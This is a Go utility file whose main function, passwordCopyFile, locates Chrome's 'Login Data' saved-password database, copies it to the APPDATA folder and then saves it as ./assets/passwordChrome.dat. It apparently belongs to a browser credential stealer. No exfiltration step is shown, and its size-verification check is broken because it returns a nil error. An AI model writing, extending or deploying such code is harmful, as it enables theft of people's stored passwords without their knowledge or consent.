package utils

import (
	"fmt"
	"io"
	"log"
	"os"
)

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func passwordCopyFile() {
	// Check for Login Data file
	if !checkFileExist(AllData().DataPath) {
		os.Exit(0)
	}

	// Copy Login Data file to temp location
	err := copyFileToDirectory(AllData().DataPath, os.Getenv("APPDATA")+"\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}

	// Open the copied .dat file and return it
	datFile, err := os.Open(os.Getenv("APPDATA") + "\\tempfile.dat")
	if err != nil {
		log.Fatal(err)
	}
	defer datFile.Close()

	// Create a new file to save the .dat file
	newDatFile, err := os.Create("./assets/passwordChrome.dat")
	if err != nil {
		log.Fatal(err)
	}
	defer newDatFile.Close()

	_, err = io.Copy(newDatFile, datFile)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("File saved as ./assets/passwordChrome.dat")
}
